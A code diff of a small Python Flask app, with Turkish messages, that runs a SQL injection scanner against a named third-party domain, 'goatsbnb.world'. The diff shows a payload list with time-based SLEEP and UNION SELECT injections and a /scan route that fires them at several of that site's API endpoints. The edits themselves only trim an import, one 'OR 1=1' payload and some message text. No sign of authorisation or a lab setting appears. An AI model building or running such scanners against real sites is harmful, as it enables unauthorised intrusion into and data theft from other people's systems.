@@ -1,7 +1,6 @@
 import requests
 import time
-import sys
-from flask import Flask, request
+from flask import Flask
 
 app = Flask(__name__)
 TARGET = "goatsbnb.world"
@@ -10,7 +9,6 @@ PAYLOADS = [
     "' AND SLEEP(5)-- ",
     "' UNION SELECT NULL-- ",
     "' UNION SELECT NULL,NULL-- ",
-    "' OR 1=1-- ",
 ]
 
 def test_sqli(url):
@@ -29,11 +27,11 @@ def test_sqli(url):
 
 @app.route('/')
 def home():
-    return "GOATsBNB Scanner çalışıyor! /scan ile taramayı başlat."
+    return "GOATsBNB Scanner çalışıyor! /scan ile başlat."
 
 @app.route('/scan')
 def scan():
-    print("=== GOATsBNB SQLi Scanner (Render) ===")
+    print("=== Tarama başladı ===")
     endpoints = [
         f"https://{TARGET}/api?id={{id}}",
         f"https://{TARGET}/v1/user?id={{id}}",
@@ -41,7 +39,7 @@ def scan():
     ]
     for ep in endpoints:
         test_sqli(ep)
-    return "Tarama tamamlandı. Logları kontrol et."
+    return "Tarama bitti. Loglara bak."
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=10000)
